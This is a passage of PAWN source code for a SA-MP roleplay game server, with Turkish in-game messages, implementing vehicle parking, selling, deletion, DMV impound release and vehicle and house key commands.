				if(IsARC(GetPlayerVehicleID(playerid))) // RC Vehicles
				{
					new Float:vehPos[3];
					GetVehiclePos(GetPlayerVehicleID(playerid),vehPos[0], vehPos[1], vehPos[2]);
					SetPlayerPos(playerid,vehPos[0], vehPos[1]+0.5, vehPos[2]+0.5);
				}
				GetVehiclePos(PlayerVehicleInfo[ownerid][d][pvId], x, y, z);
				GetVehicleZAngle(PlayerVehicleInfo[ownerid][d][pvId], angle);
				SetVehiclePos(carid,plocx,plocy+4, plocz);
				SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
				SurfingCheck(GetPlayerVehicleID(playerid));
				UpdatePlayerVehicleParkPosition(ownerid, d, x, y, z, angle, health);
				PutPlayerInVehicle(playerid, GetPlayerVehicleID(playerid), 0);
			 	SetPlayerArmedWeapon(playerid, 0);
				SetPVarInt(playerid, "fuelonoff", 0);
				HideProgressBarForPlayer(playerid, FuelBar[playerid]);
				DestroyProgressBar(FuelBar[playerid]);
				FuelBar[playerid] = INVALID_BAR_ID;

				new string[29 + (MAX_PLAYER_NAME * 2)];
				format(string, sizeof(string), "* %s adlý kiþi %s adlý kiþinin aracýný parketti.", GetPlayerNameEx(playerid), GetPlayerNameEx(ownerid));
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return 1;
			}
		}
	}
	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
		{
			new Float:x, Float:y, Float:z, Float:angle, Float:health;
			GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], health);
            if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Sürücü koltuðunda olman lazým.");
			if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " Aracýnýz park etmek için çok hasarlý.");
			if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
			GetVehiclePos(PlayerVehicleInfo[playerid][d][pvId], x, y, z);
			GetVehicleZAngle(PlayerVehicleInfo[playerid][d][pvId], angle);
			SurfingCheck(GetPlayerVehicleID(playerid));
			UpdatePlayerVehicleParkPosition(playerid, d, x, y, z, angle, health);
			PutPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId], 0);
			SetPlayerArmedWeapon(playerid, 0);
			SetPVarInt(playerid, "fuelonoff", 0);
			HideProgressBarForPlayer(playerid, FuelBar[playerid]);
			DestroyProgressBar(FuelBar[playerid]);
			FuelBar[playerid] = INVALID_BAR_ID;

			new string[30 + (MAX_PLAYER_NAME * 2)];
			format(string, sizeof(string), "* %s aracýný parketti.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içersinde olmalýsýn");
	return 1;
}

CMD:gpark(playerid, params[])
{
	new string[128];

    new f = PlayerInfo[playerid][pGang];
	if(f == 255) return SendClientMessage(playerid, COLOR_GRAD2, "Aileden degilsiniz.");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Park etmek icin rank5 olmalýsýnýz.");
	for(new d = 0 ; d < MAX_GANG_VEHICLES; d++)
 	{
	    if(IsPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId]))
	    {
    		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GREY, "Park edebilmek icin sürücü olmalýsýnýz.");
	        new Float:x, Float:y, Float:z, Float:angle, Float:health;
	        GetVehicleHealth(FamilyVehicleInfo[f][d][fvId], health);
	        if(health < 800) return SendClientMessage(playerid, COLOR_GREY, " Arac park edilmek icin cok hasarlý.");
	        if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
            GetVehiclePos(FamilyVehicleInfo[f][d][fvId], x, y, z);
           	GetVehicleZAngle(FamilyVehicleInfo[f][d][fvId], angle);
            SurfingCheck(GetPlayerVehicleID(playerid));
            UpdateGangVehicleParkPosition(f, d, x, y, z, angle, health, 1);
  			FamilyVehicleInfo[f][d][fvSpawnx] = x;
			FamilyVehicleInfo[f][d][fvSpawny] = y;
			FamilyVehicleInfo[f][d][fvSpawnz] = z;
			FamilyVehicleInfo[f][d][fvSpawna] = angle;
			PutPlayerInVehicle(playerid, FamilyVehicleInfo[f][d][fvId], 0);
            format(string, sizeof(string), "* %s aracýnýzý park ettiniz.", GetPlayerNameEx(playerid));
            ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            SaveFamiliesHQ();
            return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, " Aracýn sahibi icinde olmalýdýr.");
	return 1;
}

CMD:modifiyelerisil(playerid, params[])
{
	new modList[512], string[128];
	new count = 0;
	for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
		if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
		{
			for(new f = 0 ; f < MAX_MODS; f++)
			{
				if(GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f) != 0)
				{
					if(f != 9 && f != 7 && f != 8)
					{
						format(modList, sizeof(modList), "%s\n%s - %s", modList, partType(f), partName(GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f)));
					}
					else
					{
					    format(modList, sizeof(modList), "%s\n%s", modList, partType(f));
					}
     				format(string, sizeof(string), "partList%d", count);
					SetPVarInt(playerid, string, GetVehicleComponentInSlot(PlayerVehicleInfo[playerid][d][pvId], f));
					count++;
				}
			}
			if(count == 0)
			{
			    SendClientMessage(playerid, COLOR_GREY, " Bu aracýn modifikasyonu yok.");
			    return 1;
			}
		    format(modList, sizeof(modList), "%s\nAll", modList);
		    format(string, sizeof(string), "partList%d", count);
		    SetPVarInt(playerid, string, 999);
		    count++;
		    SetPVarInt(playerid, "modCount", count);
		    ShowPlayerDialogEx(playerid, UNMODCARMENU, DIALOG_STYLE_LIST, "Modifiye Edilmemiþ Kýsýmlar", modList, "Seç", "Iptal");
		    return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içerisinde olmalýsýn.");
 	return 1;
}

CMD:aracsil(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "dcConfirm") == 0)
	{
		SetPVarInt(playerid, "dcConfirm", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Bu komut aracýnýzý tamamiyle silecektir ve geri dönüþü yoktur.");
		SendClientMessage(playerid, COLOR_WHITE, "Eðer aracýný silmek istediðinden eminsen, komutu tekrar yaz. (/aracsil).");
	}
	else
	{
		DeletePVar(playerid, "dcConfirm");
		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
				new
					playervehicleid = GetPlayerVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]),
					string[128];

				format(string, sizeof(string), "%s adlý kiþi %s adlý aracýný sildi.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]));
				Log("logs/playervehicle.log", string);
				DestroyPlayerVehicle(playerid, playervehicleid);
				SendClientMessage(playerid, COLOR_WHITE, "Aracýnýz silinmiþtir");

				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içerisinde olmalýsýn.");
	}

	return 1;
}
/*
CMD:refundcar(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(GetPVarInt(playerid, "dcConfirm") == 0)
	{
		SetPVarInt(playerid, "dcConfirm", 1);
		SendClientMessage(playerid, COLOR_WHITE, "Use of this command will fully delete and refund you 20 percent of the vehicle's price.");
		SendClientMessage(playerid, COLOR_WHITE, "If you're sure you want to remove your vehicle, please re-type the command (/refundcar).");
	}
	else {
		DeletePVar(playerid, "dcConfirm");

		for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
		{
			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId])) {
			    if(PlayerVehicleInfo[playerid][d][pvPrice] == 0)
			        return SendClientMessage(playerid, COLOR_GREY, "Your player vehicle is not worth anything - an admin gave it to you or the price was $0.");

				PlayerInfo[playerid][pCash] += IntToPercentage(PlayerVehicleInfo[playerid][d][pvPrice], 20);
				format(string, sizeof(string), "%s has refunded their %s for $%d.", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[id][listitem][pvId]), IntToPercentage(PlayerVehicleInfo[playerid][d][pvPrice], 20));
				Log("logs/playervehicle.log", string);

    			new
					playervehicleid = GetPlayerVehicle(playerid, PlayerVehicleInfo[playerid][listitem][pvId]);
				DestroyPlayerVehicle(playerid, playervehicleid);
				SendClientMessage(playerid, COLOR_WHITE, "Aracýnýz silinmiþtir");
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içerisinde olmalýsýn.");
	}

	return 1;
}*/

CMD:aracimisat(playerid, params[]) {
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
    for(new d = 0 ; d < MAX_PLAYERVEHICLES; d++)
	{
        if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[playerid][d][pvId]))
 		{
            new Float:health;
            GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], health);
            if(PlayerInfo[playerid][pLevel] == 1)
			{
                SendClientMessage(playerid, COLOR_GREY, "Araç satabilmek için 2 veya üstü level olmalýsýnýz.");
                return 1;
            }
            if(health < 500) return SendClientMessage(playerid, COLOR_GREY, " Aracýn satmak için çok fazla hasar almýþ.");

            new string[128], giveplayerid, price;
			if(sscanf(params, "ud", giveplayerid, price)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /aracimisat [Oyuncu ID/Ýsim] [fiyat]");

            if(price < 1) return SendClientMessage(playerid, COLOR_GREY, "Fiyat 0 dan yüksek olmalýdýr.");
            if(PlayerInfo[giveplayerid][pLevel] == 1)
			{
                SendClientMessage(playerid, COLOR_GREY, "Aracý satýcaðýnýz kiþi 2 veya üstü bir level olmalýdýr.");
                return 1;
            }
            if(playerid == giveplayerid)
			{
                SendClientMessage(playerid, COLOR_GREY, "Kendi kendine bu komutu kullanamazsýn");
                return 1;
            }
            if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_GREY, "Oyuncu oyunda deðil");
            if(ProxDetectorS(8.0, playerid, giveplayerid))
		 	{
		 	    if((PlayerInfo[giveplayerid][pDonator] < 2) && (GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 559  || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 562 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 415 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 402))
				{
				    SendClientMessage(playerid, COLOR_GREY, "Safir VIP araçlarýný Safir VIP olmayanlara satamazsýnýz..");
				    return 1;
				}
    			if((PlayerInfo[giveplayerid][pDonator] < 3) && (GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 429 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 541 || GetVehicleModel(PlayerVehicleInfo[playerid][d][pvId]) == 451))
				{
				    SendClientMessage(playerid, COLOR_GREY, "Elmas VIP araçlarýný Elmas VIP olmayanlara satamazsýnýz.");
				    return 1;
				}
				if(GetPVarInt(playerid, "SellMyTimer") > 0)
				{
					format(string, sizeof(string), "Yeniden satýþ yapmak için %d saniye beklemeniz gerek.", GetPVarInt(playerid, "SellMyTimer"));
					SendClientMessage(playerid,COLOR_GREY,string);
					return 1;
				}
                VehicleOffer[giveplayerid] = playerid;
                VehicleId[giveplayerid] = d;
                VehiclePrice[giveplayerid] = price;
                format(string, sizeof(string), "* %s adlý kiþiye %s adlý aracýný %d$ karþýlýðý satmayý önerdin.", GetPlayerNameEx(giveplayerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]), price);
                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                format(string, sizeof(string), "* %s adlý kiþi sana %s adlý aracýný %d$ karþýlýðý satmak istiyor, (/kabulet arac)", GetPlayerNameEx(playerid), GetVehicleName(PlayerVehicleInfo[playerid][d][pvId]), price);
                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

                SetPVarInt(giveplayerid, "carsaleid", PlayerVehicleInfo[playerid][d][pvRealID]);

                SetPVarInt(playerid, "SellMyTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "Bu kiþi senin yanýnda deðil");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "Sahip olduðun aracýn içerisinde olmalýsýn.");
    return 1;
}

CMD:aracimibul(playerid, params[])
{
	new vstring[1024];
	for(new i, iModelID; i < MAX_PLAYERVEHICLES; i++) {
		if((iModelID = PlayerVehicleInfo[playerid][i][pvModelId] - 400) >= 0) {
			if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
				format(vstring, sizeof(vstring), "%s\n%s (baglanmis)", vstring, VehicleName[iModelID]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvDisabled]) {
				format(vstring, sizeof(vstring), "%s\n%s (kullanilamaz halde)", vstring, VehicleName[iModelID]);
			}
			else if(!PlayerVehicleInfo[playerid][i][pvSpawned]) {
				format(vstring, sizeof(vstring), "%s\n%s (saklý)", vstring, VehicleName[iModelID]);
			}
			else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[iModelID]);
		}
		else strcat(vstring, "\nBos");
	}
	ShowPlayerDialogEx(playerid, TRACKCAR, DIALOG_STYLE_LIST, "Araç GPS Takibi", vstring, "Takipet", "Iptal");
	return 1;
}

CMD:radarsilahi(playerid, params[])
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pDivision] == 2 || PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pRank] >= 5)
	{
		new string[128];
		if(IsPlayerInAnyVehicle(playerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Araçtayken bunu yapamazsýn.");
			return 1;
		}

		if(GetPVarInt(playerid, "PBM") > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Paintball oyunundayken bunu yapamazsýn.");
			return 1;
		}
		if(GetPVarInt(playerid, "EventToken") != 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "Tazerini etkinlikteyken kullanamazsýn.");
			return 1;
		}

		if(GetPVarInt(playerid, "Injured") == 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "Þu an bunu yapamazsýn.");
			return 1;
		}

		if(PlayerInfo[playerid][pJailed] > 0)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Hapiste bunu kullanamazsýn.");
			return 1;
		}
		if(PlayerCuffed[playerid] >= 1) {
			SendClientMessage(playerid, COLOR_WHITE, "Kelepçeli yada tazerliyken bunu kullanamazsýn.");
			return 1;
		}

		new SpeedRadar = GetPVarInt(playerid, "Hiz Radari");
		if(SpeedRadar == 0)
		{
			SetPVarInt(playerid, "RadarReplacement", PlayerInfo[playerid][pGuns][9]);
			if(PlayerInfo[playerid][pGuns][9] != 0) RemovePlayerWeapon(playerid, PlayerInfo[playerid][pGuns][9]);
			format(string, sizeof(string), "%s adlý kiþi hýz tespiti yapan kamerasýný çýkarýr.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			GivePlayerValidWeapon(playerid, 43, 60000);
			SetPVarInt(playerid, "Hiz Radari", 1);
		}
		else
		{
			RemovePlayerWeapon(playerid, 43);
			GivePlayerValidWeapon(playerid, GetPVarInt(playerid, "RadarReplacement"), 60000);
			format(string, sizeof(string), "%s adlý kiþi hiz tespiti yapan kamerasýný yerine koyar.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			DeletePVar(playerid, "Hiz Radari");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Polis / FBI / Sahil Güvenlik deðilsin.");
		return 1;
	}
	return 1;
}

CMD:dmvbirak(playerid, params[]) {
	switch(PlayerInfo[playerid][pFaction]) {
		case 1, 2: {}
		default: return 1;
	}
    if(IsPlayerInRangeOfPoint(playerid, 3.0, 833.60, 3.23, 1004.17)) {

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /dmvbirak [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				vstring[1024],
				iCount;

			for(new i; i < MAX_PLAYERVEHICLES; i++) {
		    	if(PlayerVehicleInfo[iTargetID][i][pvPrice] < 1) PlayerVehicleInfo[iTargetID][i][pvPrice] = 5000;

		    	new iCost = (PlayerVehicleInfo[iTargetID][i][pvPrice] / 10) + PlayerVehicleInfo[iTargetID][i][pvTicket];

		    	if(iCost > 100)
		        	iCost = 100;

				if(PlayerVehicleInfo[iTargetID][i][pvId] > INVALID_PLAYER_VEHICLE_ID) {
					if(PlayerVehicleInfo[iTargetID][i][pvTicket]) {
						format(vstring, sizeof(vstring), "%s\n%s (ceza - $%i)", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400], PlayerVehicleInfo[iTargetID][i][pvTicket]);
						++iCount;
					}
					else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400]);
				}
				else if(PlayerVehicleInfo[iTargetID][i][pvImpounded]) {
					format(vstring, sizeof(vstring), "%s\n%s (baglanmis - geri almak için $%i )", vstring, VehicleName[PlayerVehicleInfo[iTargetID][i][pvModelId] - 400], iCost);
					++iCount;
				}
				else format(vstring, sizeof(vstring), "%s\nYok", vstring);
			}
			if(iCount) ShowPlayerDialogEx(playerid, MPSPAYTICKETSCOP, DIALOG_STYLE_LIST, "Araçlar", vstring, "Birak", "Iptal"), SetPVarInt(playerid, "vRel", iTargetID);
			else SendClientMessage(playerid, COLOR_GRAD2, "Bu kiþinin býrakmasý gereken bir aracý yada ödemesi gereken bir cezasý yok.");
		}
		else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "DMV içerisindeki araç býrakma noktasýnda deðilsin. (DMV binasý içi).");
	return 1;
}

CMD:dmvmenu(playerid, params[])
{
    if(IsPlayerInRangeOfPoint(playerid, 3.0, 833.60, 3.23, 1004.17))
	{
	    if(PlayerInfo[playerid][pCarLic] == 0)
	    {
	        SendClientMessage(playerid, COLOR_GRAD2, "Aracýnýzý çýkarmak yada cezasýný ödemek için geçerli sürücü lisansýna ihtiyacýnýz var.");
	        return 1;
	    }

		new
			vstring[1024],
			iCount;

		for(new i; i < MAX_PLAYERVEHICLES; i++) {
		    if(PlayerVehicleInfo[playerid][i][pvPrice] < 1) PlayerVehicleInfo[playerid][i][pvPrice] = 5000;

		    new iCost = (PlayerVehicleInfo[playerid][i][pvPrice] / 10) + PlayerVehicleInfo[playerid][i][pvTicket] + (PlayerInfo[playerid][pLevel] * 10);

		    if(iCost > 10000)
		    {
		        iCost = 1000;
		    }

			if(PlayerVehicleInfo[playerid][i][pvId] > INVALID_PLAYER_VEHICLE_ID) {
				if(PlayerVehicleInfo[playerid][i][pvTicket]) {
					format(vstring, sizeof(vstring), "%s\n%s (Ceza - $%i)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], PlayerVehicleInfo[playerid][i][pvTicket]);
					++iCount;
				}
				else format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			}
			else if(PlayerVehicleInfo[playerid][i][pvImpounded]) {
				format(vstring, sizeof(vstring), "%s\n%s (Baglanmis - $%i Birak)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], iCost);
				++iCount;
			}
			else format(vstring, sizeof(vstring), "%s\nYok", vstring);
		}
		if(iCount)
		{
			ShowPlayerDialogEx(playerid, MPSPAYTICKETS, DIALOG_STYLE_LIST, "Araclar", vstring, "Birak", "Iptal");
		}
		else SendClientMessage(playerid, COLOR_GRAD2, "Býrakmanýz yada cezasýný ödemeniz gereken bir aracýnýz yok.");
	}
	else SendClientMessage(playerid, COLOR_GRAD2, "DMV içerisindeki araç býrakma noktasýnda deðilsin. (DMV binasý içi).");
	return 1;
}

CMD:anahtarver(playerid, params[])
{
	new
		giveplayerid;

    if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /anahtarver [Oyuncu ID/Ýsim]");
    if(IsPlayerConnected(giveplayerid))
	{
        if(playerid == giveplayerid) return 1;
        if(ProxDetectorS(8.0, playerid, giveplayerid))
		{
            new
				iValidVehicles,
				vstring[512];

			for(new i; i < MAX_PLAYERVEHICLES; i++)
			{
				if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID)
					format(vstring, sizeof(vstring), "%s\n%s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]), ++iValidVehicles;

				else if(PlayerVehicleInfo[playerid][i][pvImpounded] == 1)
					format(vstring, sizeof(vstring), "%s\n%s (El Konulmuþ)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else if(PlayerVehicleInfo[playerid][i][pvDisabled] == 1 && PlayerVehicleInfo[playerid][i][pvModelId] >= 400)
				format(vstring, sizeof(vstring), "%s\n%s (Men Edilmiþ)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else if(PlayerVehicleInfo[playerid][i][pvSpawned] == 0 && PlayerVehicleInfo[playerid][i][pvModelId] >= 400)
				format(vstring, sizeof(vstring), "%s\n%s (Garajda)", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);

				else
					format(vstring, sizeof(vstring), "%s\nYok", vstring);
			}
            if(iValidVehicles != 0)
			{
                GiveKeysTo[playerid] = giveplayerid;
                ShowPlayerDialogEx(playerid, GIVEKEYS, DIALOG_STYLE_LIST, "Lütfen bir araç seçin.", vstring, "Anahtarlarý ver", "Iptal");
            }
            else
			{
                SendClientMessage(playerid, COLOR_GRAD2, "Aracýn yok.");
            }
        }
        else
		{
            SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþiye yeteri kadar yaklaþmadýn.");
        }
    }
    return 1;
}

CMD:anahtarlar(playerid, params[])
{
    new vstring[768], iValidVehicles;
	for(new i = 0; i < MAX_PLAYERVEHICLES; i++) {
	    if(PlayerVehicleInfo[playerid][i][pvId] != INVALID_PLAYER_VEHICLE_ID) {
	        if(PlayerVehicleInfo[playerid][i][pvAllowedplayerid] != INVALID_PLAYER_ID) {
				format(vstring, sizeof(vstring), "%s\n%s | Anahtarlar: %s", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400], GetPlayerNameEx(PlayerVehicleInfo[playerid][i][pvAllowedplayerid]));
				iValidVehicles ++;
			} else if(PlayerVehicleInfo[playerid][i][pvImpounded] == 1 || PlayerVehicleInfo[playerid][i][pvSpawned] == 0) {
				format(vstring, sizeof(vstring), "%s\n%s | Anahtarlar: Kullanýlabilir deðil", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			} else {
                format(vstring, sizeof(vstring), "%s\n%s | Anahtarlar: Kimsede deðil", vstring, VehicleName[PlayerVehicleInfo[playerid][i][pvModelId] - 400]);
			}
		} else {
			format(vstring, sizeof(vstring), "%s\nYok", vstring);
		}
	}
	if(iValidVehicles != 0) {
		ShowPlayerDialogEx(playerid, REMOVEKEYS, DIALOG_STYLE_LIST, "Lütfen bir araç seç.", vstring, "Anahtarlarý al", "Iptal");
	} else SendClientMessage(playerid, COLOR_GRAD2, "Hiç kimseye anahtar vermedin.");
	return 1;
}

CMD:evanahtariver(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");

	new
		giveplayerid,
		houseid,
		HasSomeoneBeeenGivenTheKey;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evanahtariver [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "Kendi kendine ev anahtarýný veremezsin.");

			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				new
					szMessage[128];

				if(HouseKey[giveplayerid] != INVALID_HOUSE_ID)
					return SendClientMessage(playerid, COLOR_GRAD1, "Kiþi zaten baþkasýnýn ev anahtarýný taþýyor.");

				foreach(Player, i) {
					if(PlayerInfo[playerid][pHouse] == HouseKey[i]) HasSomeoneBeeenGivenTheKey++;
				}

				if(HasSomeoneBeeenGivenTheKey > 0)
					return SendClientMessage(playerid, COLOR_GRAD1, "Ev anahtarlarýný zaten baþkasýna vermiþtin.");

				HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse];
				format(szMessage, sizeof(szMessage), "%s sana evinin anahtarlarýný verdi.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "%s adlý kiþiye ev anahtarlarýný verdin.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþiye yeteri kadar yaklaþmadýn.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	} else {
		if(sscanf(params, "ui", giveplayerid, houseid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evanahtariver [Oyuncu ID/Ýsim] [Ev 1/2]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
				return SendClientMessage(playerid, COLOR_GRAD2, "Ev anahtarlarýný kendine veremezsin.");

			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				new
					szMessage[128],
					firstorsecond[30];

				if(HouseKey[giveplayerid] != INVALID_HOUSE_ID)
					return SendClientMessage(playerid, COLOR_GRAD1, "Kiþi zaten baþkasýnýn ev anahtarýný taþýyor.");

				foreach(Player, i) {
					if(PlayerInfo[playerid][pHouse] == HouseKey[i]) HasSomeoneBeeenGivenTheKey = 1;
					else if(PlayerInfo[playerid][pHouse2] == HouseKey[i]) HasSomeoneBeeenGivenTheKey = 2;
					else { }
				}

				if(HasSomeoneBeeenGivenTheKey == 1 && houseid == 1)
					return SendClientMessage(playerid, COLOR_GRAD1, "Anahtarý zaten baþkasýna verdin.");
				if(HasSomeoneBeeenGivenTheKey == 2 && houseid == 2)
					return SendClientMessage(playerid, COLOR_GRAD1, "Anahtarý zaten baþkasýna verdin.");

				if(houseid == 1) {
					HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse];
					firstorsecond = "birinci";
				} else if(houseid == 2) {
					HouseKey[giveplayerid] = PlayerInfo[playerid][pHouse2];
					firstorsecond = "ikinci";
				}
				else return SendClientMessage(playerid, COLOR_GRAD1, "Yanlýþ Ev ID.");

				format(szMessage, sizeof(szMessage), "%s sana %s evinin anahtarlarýný verdi.", GetPlayerNameEx(playerid), firstorsecond);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, szMessage);
				format(szMessage, sizeof(szMessage), "%s adlý kiþiye %s evinin anahtarlarýný verdin.", GetPlayerNameEx(giveplayerid), firstorsecond);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, szMessage);
			} else return SendClientMessage(playerid, COLOR_GRAD1, "Bu oyuncuya yeteri kadar yaklaþmadýn.");
		} else return SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
    return 1;
}

CMD:evanahtarlarinial(playerid, params[])
{
	if(PlayerInfo[playerid][pHouse] == INVALID_HOUSE_ID && PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID)
		return SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");

	new
		giveplayerid,
		houseid;

	if(PlayerInfo[playerid][pHouse2] == INVALID_HOUSE_ID) {
		if(sscanf(params, "u", giveplayerid))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evanahtarlarinial [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid)) {
			if(playerid == giveplayerid)
